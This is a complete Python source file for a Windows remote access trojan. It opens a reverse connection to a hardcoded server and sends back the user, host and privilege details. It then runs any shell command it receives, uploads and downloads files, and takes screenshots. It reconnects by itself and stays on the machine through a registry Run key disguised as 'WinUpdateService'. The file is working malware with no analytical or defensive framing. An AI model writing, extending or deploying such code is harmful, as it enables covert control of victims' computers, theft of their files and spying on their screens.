import socket
import os
import subprocess
import ctypes
import platform
import base64
import shutil
import winreg
from PIL import ImageGrab
import sys
import time

# Configuration settings
SERVER_IP = "192.168.19.123"  # Server IP address on subnet 192.168.19.0/24
SERVER_PORT = 8080            # Change this to your desired port
RECONNECT_DELAY = 30          # Seconds to wait before reconnection attempts


def add_to_registry():
    """
    Adds the script to Windows registry to achieve persistence.
    This makes the script run when the user logs in.
    """
    try:
        path = os.path.realpath(__file__)
        name = "WinUpdateService"  # Name that appears in registry
        key = winreg.HKEY_CURRENT_USER
        regpath = r"Software\Microsoft\Windows\CurrentVersion\Run"
        regkey = winreg.OpenKey(key, regpath, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(regkey, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(regkey)
        return True
    except Exception:
        return False


def check_admin():
    """
    Checks if the script is running with administrator privileges.
    
    Returns:
        bool: True if running as admin, False otherwise
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def get_system_info():
    """
    Gathers basic system information.
    
    Returns:
        str: Formatted string with system information
    """
    try:
        user = os.getlogin()
        host = platform.node()
        os_name = platform.system()
        os_version = platform.version()
        privileges = "Admin" if check_admin() else "Standard User"
        return f"Connected to {host} - {os_name} {os_version} - {user} ({privileges})"
    except Exception as e:
        return f"Connected: Error gathering system info: {e}"


def receive_all(client, buffer_size=4096, end_marker=b"ENDOFFILE"):
    """
    Receive data until end marker is encountered.
    
    Args:
        client: Socket connection
        buffer_size: Size of each chunk
        end_marker: Sequence indicating end of data
        
    Returns:
        bytes: Complete received data
    """
    data = b""
    while True:
        chunk = client.recv(buffer_size)
        if not chunk:
            break
        if chunk.endswith(end_marker):
            data += chunk[:-len(end_marker)]
            break
        data += chunk
    return data


def connect():
    """
    Main function that establishes connection to the server and handles commands.
    Implements reconnection mechanism if connection is lost.
    """
    while True:
        try:
            # Attempt to add to registry for persistence (Windows only)
            if platform.system() == "Windows":
                add_to_registry()
                
            # Create socket and connect to server
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            
            # Send system information upon connection
            system_info = get_system_info()
            client.send(system_info.encode())
            
            # Main command loop
            while True:
                try:
                    command = client.recv(4096).decode().strip()
                    
                    # Handle various commands
                    if command == "terminate":
                        client.close()
                        return  # Exit the program completely
                        
                    elif command == "pwd":
                        client.send(os.getcwd().encode())
                        
                    elif command == "ls":
                        try:
                            items = os.listdir()
                            response = "\n".join(items) if items else "Directory is empty"
                            client.send(response.encode())
                        except Exception as e:
                            client.send(f"[!] Error listing directory: {e}".encode())
                            
                    elif command.startswith("cd "):
                        try:
                            directory = command[3:]
                            os.chdir(directory)
                            client.send(f"Changed to {os.getcwd()}".encode())
                        except Exception as e:
                            client.send(f"[!] Cannot change directory: {e}".encode())
                            
                    elif command == "checkadmin":
                        privileges = "Admin" if check_admin() else "Standard User"
                        client.send(f"User has {privileges} privileges".encode())
                        
                    elif command.startswith("upload "):
                        try:
                            _, path, b64_data = command.split(" ", 2)
                            with open(path, "wb") as f:
                                f.write(base64.b64decode(b64_data))
                            client.send(f"[+] File uploaded to {path}".encode())
                        except Exception as e:
                            client.send(f"[!] Upload failed: {e}".encode())
                            
                    elif command.startswith("download "):
                        try:
                            path = command.split(" ", 1)[1]
                            if not os.path.exists(path):
                                client.send(f"[!] File not found: {path}".encode())
                                continue
                                
                            client.send(f"[+] Sending {path}".encode())
                            
                            # Read file and send as base64
                            with open(path, "rb") as f:
                                file_data = f.read()
                                
                            encoded_data = base64.b64encode(file_data)
                            client.send(encoded_data + b"ENDOFFILE")
                        except Exception as e:
                            client.send(f"[!] Download failed: {e}".encode())
                            
                    elif command == "screenshot":
                        try:
                            temp_file = "temp_screen.png"
                            img = ImageGrab.grab()
                            img.save(temp_file)
                            
                            with open(temp_file, "rb") as f:
                                screenshot_data = f.read()
                                
                            client.send(screenshot_data + b"ENDOFFILE")
                            
                            # Clean up temporary file
                            try:
                                os.remove(temp_file)
                            except:
                                pass
                        except Exception as e:
                            client.send(f"[!] Screenshot failed: {e}".encode())
                            
                    else:
                        # Execute shell command
                        try:
                            output = subprocess.check_output(
                                command, 
                                shell=True, 
                                stderr=subprocess.STDOUT,
                                universal_newlines=True
                            )
                            response = output if output else "Command executed (no output)"
                            client.send(response.encode())
                        except subprocess.CalledProcessError as e:
                            client.send(f"[!] Command error: {e.output}".encode())
                        except Exception as e:
                            client.send(f"[!] Execution error: {e}".encode())
                            
                except ConnectionError:
                    break  # Break inner loop to reconnect
                except Exception as e:
                    try:
                        client.send(f"[!] Error processing command: {e}".encode())
                    except:
                        break  # Connection likely lost, break to outer loop to reconnect
                        
        except Exception:
            # Wait before reconnection attempt
            time.sleep(RECONNECT_DELAY)
            continue


if __name__ == "__main__":
    try:
        connect()
    except KeyboardInterrupt:
        sys.exit(0)